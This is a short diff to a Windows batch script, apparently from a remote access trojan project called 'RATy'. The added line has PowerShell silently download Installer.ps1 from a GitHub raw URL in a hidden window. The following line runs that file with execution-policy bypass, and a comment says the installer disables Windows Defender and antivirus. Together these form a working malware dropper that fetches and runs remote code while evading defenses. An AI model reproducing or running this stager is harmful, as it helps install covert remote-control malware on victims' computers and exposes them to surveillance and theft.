@@ -36,7 +36,7 @@ if '%errorlevel%' NEQ '0' (
     @REM => We are disabling Window Defender and AV in 'Installer.ps1'
 
 @REM RATy resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest-URI '' -OutFile '' "
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest-URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/Installer.ps1' -OutFile 'installer.ps1' "
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1" & @REM Execution Policy Bypass
 
 
